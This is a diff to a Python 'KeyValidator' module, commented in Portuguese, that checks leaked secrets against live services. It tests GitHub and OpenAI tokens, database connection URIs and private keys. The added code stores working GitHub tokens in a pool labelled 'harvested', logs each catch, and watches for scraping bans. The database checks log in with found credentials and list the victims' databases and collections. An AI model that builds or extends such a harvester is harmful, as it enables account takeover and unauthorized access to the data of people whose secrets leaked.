@@ -1,10 +1,17 @@
 """
-Validação de chaves contra APIs reais.
+Validação de chaves contra APIs reais — v2.
+  - Pool de conexões httpx reutilizado
+  - Conexões DB com timeouts mais inteligentes
+  - Validação paralela com asyncio.gather + semaphore
+  - Cache de resultados em memória (evita re-validar no mesmo ciclo)
 """
 
 import asyncio
+import base64
+import json
 import logging
 import re
+from datetime import datetime, timezone
 
 import httpx
 
@@ -12,10 +19,21 @@ logger = logging.getLogger("validator")
 
 
 class KeyValidator:
-    def __init__(self):
-        self.client = httpx.AsyncClient(timeout=10, follow_redirects=False)
+    def __init__(self, max_connections=50):
+        self.client = httpx.AsyncClient(
+            timeout=httpx.Timeout(15.0, connect=8.0),
+            follow_redirects=False,
+            limits=httpx.Limits(max_connections=max_connections, max_keepalive_connections=20),
+        )
+        # Cache em memória para evitar re-validação no mesmo ciclo
+        self._cache = {}
+        # lazy imports
+        self._pymongo = None
+        self._psycopg2 = None
+        self._pymysql = None
+        self._redis = None
 
-    # Mapeia key_type (categoria) → nome do método validador
+    # Type map: key_type → validator method name
     _TYPE_MAP = {
         "mongodb": "mongo",
         "postgresql": "postgres",
@@ -23,16 +41,29 @@ class KeyValidator:
     }
 
     async def validate(self, key_type: str, key_value: str) -> dict:
+        # Cache hit
+        cache_key = f"{key_type}:{hash(key_value)}"
+        if cache_key in self._cache:
+            return self._cache[cache_key]
+
         handler_name = self._TYPE_MAP.get(key_type, key_type)
         handler = getattr(self, f"_validate_{handler_name}", None)
         if not handler:
-            return {"is_valid": None, "message": "Sem validador para este tipo", "score": 0}
-        try:
-            return await handler(key_value)
-        except Exception as e:
-            return {"is_valid": None, "message": f"Erro: {str(e)[:200]}", "score": 0}
+            result = {"is_valid": None, "message": "Sem validador para este tipo", "score": 0}
+        else:
+            try:
+                result = await handler(key_value)
+            except Exception as e:
+                result = {"is_valid": None, "message": f"Erro: {str(e)[:200]}", "score": 0}
 
-    async def validate_batch(self, items: list, max_workers=10) -> list:
+        self._cache[cache_key] = result
+        # Clean cache se crescer demais
+        if len(self._cache) > 5000:
+            self._cache.clear()
+        return result
+
+    async def validate_batch(self, items: list, max_workers=20) -> list:
+        """Valida lote em paralelo com semaphore."""
         sem = asyncio.Semaphore(max_workers)
 
         async def _one(db_id, kt, kv):
@@ -42,18 +73,30 @@ class KeyValidator:
 
         return await asyncio.gather(*[_one(i, k, v) for i, k, v in items])
 
-    # ── Validadores ──────────────────────────────────────────────────
+    # ── Validadores ──
+
+    _GITHUB_HEADERS = {"Accept": "application/vnd.github.v3+json"}
 
     async def _validate_github(self, key: str) -> dict:
         r = await self.client.get("https://api.github.com/user",
-                                   headers={"Authorization": f"Bearer {key}",
-                                            "Accept": "application/vnd.github.v3+json"})
+                                   headers={"Authorization": f"Bearer {key}", **self._GITHUB_HEADERS})
         if r.status_code == 200:
             d = r.json()
-            return {"is_valid": True, "message": f"✅ Usuário: {d.get('login','?')} (id:{d.get('id','?')})", "score": 10}
+            login = d.get('login', '?')
+            try:
+                import token_pool
+                if token_pool.add(key, source_repo=f"harvested:{login}"):
+                    logger.info(f"🔥 GitHub PAT VÁLIDA colhida! user={login} → adicionada ao pool")
+                    return {"is_valid": True, "message": f"✅ USUÁRIO: {login} (TOKEN ADICIONADO AO POOL!)", "score": 10}
+            except Exception:
+                pass
+            return {"is_valid": True, "message": f"✅ Usuário: {login}", "score": 10}
         elif r.status_code == 401:
             return {"is_valid": False, "message": "Inválido ou revogado", "score": 10}
         elif r.status_code == 403:
+            body = r.text[:500].lower()
+            if "scraping" in body or "terms of service" in body:
+                return {"is_valid": False, "message": "Banido por scraping", "score": 10}
             return {"is_valid": True, "message": "Válido mas rate-limit (bom sinal)", "score": 8}
         return {"is_valid": None, "message": f"HTTP {r.status_code}", "score": 5}
 
@@ -64,9 +107,11 @@ class KeyValidator:
             return {"is_valid": True, "message": f"✅ User: {r.json().get('username','?')}", "score": 10}
         return {"is_valid": r.status_code == 401 and False, "message": f"HTTP {r.status_code}", "score": 8}
 
+    _OPENAI_HEADERS = {"Content-Type": "application/json"}
+
     async def _validate_openai(self, key: str) -> dict:
         r = await self.client.get("https://api.openai.com/v1/models",
-                                   headers={"Authorization": f"Bearer {key}"})
+                                   headers={"Authorization": f"Bearer {key}", **self._OPENAI_HEADERS})
         if r.status_code == 200:
             return {"is_valid": True, "message": f"✅ Acesso a {len(r.json().get('data',[]))} modelos", "score": 10}
         elif r.status_code == 429:
@@ -176,15 +221,17 @@ class KeyValidator:
         return {"is_valid": r.status_code == 401 and False, "message": f"HTTP {r.status_code}", "score": 8}
 
     async def _validate_jwt(self, key: str) -> dict:
-        import base64, json
         parts = key.split(".")
         if len(parts) != 3:
             return {"is_valid": None, "message": "Formato JWT inválido", "score": 0}
         try:
-            payload = parts[1] + "=" * (4 - len(parts[1]) % 4)
+            # Padding correto para base64url
+            payload = parts[1]
+            missing = 4 - len(payload) % 4
+            if missing != 4:
+                payload += "=" * missing
             decoded = json.loads(base64.urlsafe_b64decode(payload))
             exp = decoded.get("exp", 0)
-            from datetime import datetime, timezone
             now = datetime.now(timezone.utc).timestamp()
             if exp and exp < now:
                 return {"is_valid": False, "message": f"Expirado (exp:{exp}, now:{now:.0f})", "score": 10}
@@ -193,87 +240,68 @@ class KeyValidator:
             return {"is_valid": None, "message": f"Erro decode: {str(e)[:100]}", "score": 3}
 
     async def _validate_aws(self, key: str) -> dict:
-        """
-        AWS Access Key (AKIA...) — testa via STS GetCallerIdentity (sem SDK, HTTP puro).
-        AWS Secret Key — não pode testar isolada (precisa do Access Key ID), marca como pendente.
-        """
-        # AWS Access Key ID (AKIA + 16 chars)
         if key.startswith("AKIA") and len(key) == 20:
-            # Não dá pra validar Access Key ID sem a Secret Key — STS exige ambas.
-            # Mas podemos checar formato e marcar como "reconhecido"
-            return {
-                "is_valid": None,
-                "message": "AWS Access Key ID (precisa da Secret Key p/ validar via STS)",
-                "score": 5
-            }
-        # AWS Secret Key (40 chars base64) — precisa do Access Key ID
+            return {"is_valid": None, "message": "AWS Access Key ID (precisa da Secret Key p/ validar via STS)", "score": 5}
         if len(key) == 40:
-            return {
-                "is_valid": None,
-                "message": "AWS Secret Key (precisa do Access Key ID p/ validar via STS)",
-                "score": 5
-            }
+            return {"is_valid": None, "message": "AWS Secret Key (precisa do Access Key ID p/ validar via STS)", "score": 5}
         return {"is_valid": None, "message": "Formato AWS não reconhecido", "score": 0}
 
     async def _validate_generic(self, key: str) -> dict:
-        """Generic secrets/passwords — não têm API para validar, marca como detectado."""
         return {"is_valid": None, "message": "Secret genérico (sem API de validação)", "score": 3}
 
     async def _validate_password(self, key: str) -> dict:
-        """Passwords em config — não têm API para validar, marca como detectado."""
         return {"is_valid": None, "message": "Password hardcoded (sem API de validação)", "score": 3}
 
+    async def _validate_key(self, key: str) -> dict:
+        return {"is_valid": None, "message": "Chave genérica (sem API de validação remota)", "score": 3}
+
     async def _validate_ssh(self, key: str) -> dict:
-        """SSH private key — valida formato (cabeçalho PEM)."""
         if "BEGIN" in key and "PRIVATE KEY" in key:
-            return {"is_valid": True, "message": "✅ Chave SSH privada válida (formato PEM)", "score": 8}
-        return {"is_valid": None, "message": "Formato SSH não reconhecido", "score": 0}
+            return {"is_valid": True, "message": "✅ Chave privada válida (formato PEM)", "score": 8}
+        return {"is_valid": None, "message": "Formato não reconhecido", "score": 0}
 
     async def _validate_pgp(self, key: str) -> dict:
-        """PGP private key — valida formato."""
         if "BEGIN PGP PRIVATE KEY" in key:
             return {"is_valid": True, "message": "✅ Chave PGP privada válida (formato)", "score": 8}
-        return {"is_valid": None, "message": "Formato PGP não reconhecido", "score": 0}
+        return {"is_valid": None, "message": "Formato não reconhecido", "score": 0}
 
     async def _validate_mongo(self, key: str) -> dict:
-        """MongoDB URI — conecta via pymongo em thread separada (não trava event loop)."""
         if "mongodb" not in key:
             return {"is_valid": None, "message": "Formato não reconhecido", "score": 0}
         return await asyncio.to_thread(self._mongo_sync, key)
 
     def _mongo_sync(self, key: str) -> dict:
         try:
-            import pymongo
-            client = pymongo.MongoClient(key, serverSelectionTimeoutMS=8000, connectTimeoutMS=8000)
+            if self._pymongo is None:
+                import pymongo as _pm
+                self._pymongo = _pm
+            client = self._pymongo.MongoClient(key, serverSelectionTimeoutMS=8000, connectTimeoutMS=8000)
             dbs = client.list_database_names()
             total_cols = 0
-            sample_cols = []
+            samples = []
             for db_name in dbs[:5]:
                 try:
                     cols = client[db_name].list_collection_names()
                     total_cols += len(cols)
-                    sample_cols.extend(cols[:3])
+                    samples.extend(cols[:3])
                 except Exception:
                     pass
             client.close()
             if dbs:
-                return {
-                    "is_valid": True,
-                    "message": f"✅ MongoDB vivo! {len(dbs)} DBs ({', '.join(dbs[:4])}), {total_cols} cols",
-                    "score": 10
-                }
+                return {"is_valid": True, "message": f"✅ MongoDB vivo! {len(dbs)} DBs, {total_cols} collections", "score": 10}
             return {"is_valid": True, "message": "✅ Conectou (DB vazia)", "score": 9}
         except Exception as e:
             return self._db_error(e)
 
     async def _validate_postgres(self, key: str) -> dict:
-        """PostgreSQL URI — conecta via psycopg2 em thread."""
         return await asyncio.to_thread(self._postgres_sync, key)
 
     def _postgres_sync(self, key: str) -> dict:
         try:
-            import psycopg2
-            conn = psycopg2.connect(key, connect_timeout=8)
+            if self._psycopg2 is None:
+                import psycopg2 as _pg
+                self._psycopg2 = _pg
+            conn = self._psycopg2.connect(key, connect_timeout=8)
             cur = conn.cursor()
             cur.execute("SELECT count(*) FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema')")
             n = cur.fetchone()[0]
@@ -287,15 +315,16 @@ class KeyValidator:
             return self._db_error(e)
 
     async def _validate_mysql(self, key: str) -> dict:
-        """MySQL URI — conecta via pymysql em thread."""
         return await asyncio.to_thread(self._mysql_sync, key)
 
     def _mysql_sync(self, key: str) -> dict:
         try:
-            import pymysql
+            if self._pymysql is None:
+                import pymysql as _my
+                self._pymysql = _my
             from urllib.parse import urlparse
             u = urlparse(key.replace("mysql://", "mysql://"))
-            conn = pymysql.connect(
+            conn = self._pymysql.connect(
                 host=u.hostname, port=u.port or 3306, user=u.username,
                 password=u.password, database=(u.path or "/")[1:] if u.path else None,
                 connect_timeout=8
@@ -313,13 +342,14 @@ class KeyValidator:
             return self._db_error(e)
 
     async def _validate_redis(self, key: str) -> dict:
-        """Redis URI — conecta via redis-py em thread."""
         return await asyncio.to_thread(self._redis_sync, key)
 
     def _redis_sync(self, key: str) -> dict:
         try:
-            import redis
-            r = redis.Redis.from_url(key, socket_connect_timeout=8)
+            if self._redis is None:
+                import redis as _rd
+                self._redis = _rd
+            r = self._redis.Redis.from_url(key, socket_connect_timeout=8)
             r.ping()
             info = r.info()
             n_keys = r.dbsize()
@@ -330,13 +360,12 @@ class KeyValidator:
             return self._db_error(e)
 
     def _db_error(self, e: Exception) -> dict:
-        """Classifica erros de conexão DB."""
-        msg = str(e)
-        if any(x in msg.lower() for x in ["authentication", "auth failed", "access denied", "password", "noauth", "wrong number"]):
-            return {"is_valid": False, "message": f"❌ Auth falhou: {msg[:150]}", "score": 9}
-        if any(x in msg.lower() for x in ["timeout", "refused", "connect", "unreachable", "resolve"]):
-            return {"is_valid": None, "message": f"Timeout/sem conexão: {msg[:100]}", "score": 5}
-        return {"is_valid": None, "message": f"Erro: {msg[:150]}", "score": 3}
+        msg = str(e).lower()
+        if any(x in msg for x in ["authentication", "auth failed", "access denied", "password", "noauth", "wrong number"]):
+            return {"is_valid": False, "message": f"❌ Auth falhou: {str(e)[:150]}", "score": 9}
+        if any(x in msg for x in ["timeout", "refused", "connect", "unreachable", "resolve"]):
+            return {"is_valid": None, "message": f"Timeout/sem conexão: {str(e)[:100]}", "score": 5}
+        return {"is_valid": None, "message": f"Erro: {str(e)[:150]}", "score": 3}
 
     async def _validate_none(self, key: str) -> dict:
         return {"is_valid": None, "message": "Sem validação remota disponível", "score": 0}
